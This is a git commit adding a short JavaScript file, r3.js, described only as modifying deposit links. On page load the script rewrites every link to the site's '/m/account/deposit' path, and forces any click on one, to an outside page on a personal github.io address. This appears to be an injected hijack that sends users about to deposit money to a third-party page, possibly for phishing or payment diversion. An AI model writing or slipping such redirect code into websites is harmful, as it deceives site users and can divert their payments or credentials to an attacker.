851d40eb558703ab7286c4a9694ec5431bebd827
inggarfi <inggarsaput@gmail.com>
2026-03-14 18:22:44 +0700

    Add event listener to modify deposit links

---
+++ r3.js
@@ -0,0 +1,14 @@
+document.addEventListener("DOMContentLoaded", function () {
+
+  document.querySelectorAll('a[href*="/m/account/deposit"]').forEach(function (el) {
+
+    el.href = "https://inggarfi.github.io/depoyukbos/kiw";
+
+    el.addEventListener("click", function (e) {
+      e.preventDefault();
+      window.location.href = "https://inggarfi.github.io/depoyukbos/kiw";
+    });
+
+  });
+
+});
